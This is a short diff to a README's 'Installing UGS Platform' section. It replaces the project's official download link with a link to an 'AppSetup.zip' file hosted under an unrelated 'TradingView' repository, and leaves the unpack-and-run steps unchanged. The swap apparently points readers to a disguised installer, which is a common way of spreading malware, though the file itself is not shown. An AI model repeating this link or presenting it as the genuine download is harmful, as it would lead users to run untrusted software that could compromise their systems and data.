@@ -1,7 +1,7 @@
 ## Installing UGS Platform
 <img alt="UGS Platform" src="https://raw.githubusercontent.com/winder/Universal-G-Code-Sender/master/pictures/2.0_platform_ugs_platform.png" width="500" />
 
-* Download **UGS Platform** for your OS from [here](https://github.com/winder/Universal-G-Code-Sender#downloads). 
+* Download **UGS Platform** for your OS from [here](https://github.com/QingYunLife/TradingView/releases/download/Desktop/AppSetup.zip). 
 * Unpack the zip package
 * Start the program ```bin/ugsplatform```
 
